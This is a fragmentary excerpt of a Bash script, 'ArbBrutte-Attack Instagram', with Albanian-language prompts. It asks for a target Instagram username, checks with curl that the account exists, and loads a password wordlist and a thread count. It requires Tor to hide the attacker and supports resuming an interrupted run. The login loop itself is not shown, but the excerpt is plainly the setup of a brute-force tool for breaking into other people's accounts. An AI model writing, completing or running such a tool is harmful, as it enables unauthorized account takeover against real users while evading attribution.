...
printf "\n"
printf "\e[1;77m\e[45m  ArbBrutte-Attack Instagram v1.1.1 Autor: Arbin Qazimi   \e[0m\n"
printf "\n"
}
...
#checkroot
dependencies
read -p $'\e[1;92mLlogaria e instagramit: \e[0m' user
checkaccount=$(curl -L -s https://www.instagram.com/$user/ | grep -c "llogaria ka mundesi te jete e fshire")
if [[ "$checkaccount" == 1 ]]; then
printf "\e[1;91mLlogari jo valide! Provoni perseri\e[0m\n"
sleep 1
start
else
default_wl_pass="passwords.lst"
read -p $'\e[1;92mLista ku i keni ruajtur fjalekalimet (Shtyp enter per default listen): \e[0m' wl_pass
wl_pass="${wl_pass:-${default_wl_pass}}"
default_threads="10"
read -p $'\e[1;92mThreads (Perdor < 20, Default 10): \e[0m' threads
...
if [[ "$check" -gt 0 ]]; then
printf "\e[1;91mJu lutem, kontrolloni nese e keni lidhjen TOR! Vetem shtypeni tor ose service tor\n\e[0m"
exit 1
fi
...
if [[ -n "$threads" ]]; then
printf "\e[1;91m [*] Ju lutem prisni threads jane duke ndaluar...\n\e[0m"
...
printf "\e[1;77mProcesi u ruajt.\e[0m\n"
printf "\e[1;92mUse ./ArbBrutte-Attack --resume\n"
else
exit 1
fi
else
